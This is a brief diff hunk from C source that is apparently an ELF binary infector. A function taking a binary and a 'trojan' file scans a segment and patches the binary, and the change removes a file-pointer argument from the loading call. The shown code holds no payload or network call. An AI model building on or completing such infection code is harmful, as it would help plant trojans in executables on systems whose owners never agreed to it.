@@ -82,7 +82,7 @@ static bool doit(const char *binfile, const char *trojan) {
     if (elfo) {
         long magic = (long)0x1122334455667788;
 
-        infect_t *inf = inf_load(elfo, trojanfp, m1, magic, &src_map);
+        infect_t *inf = inf_load(elfo, m1, magic, &src_map);
         if (inf_scan_segment(inf)) {
             if ((rc = inf_load_and_patch(inf)) == true) {
                 // Make sure it is written
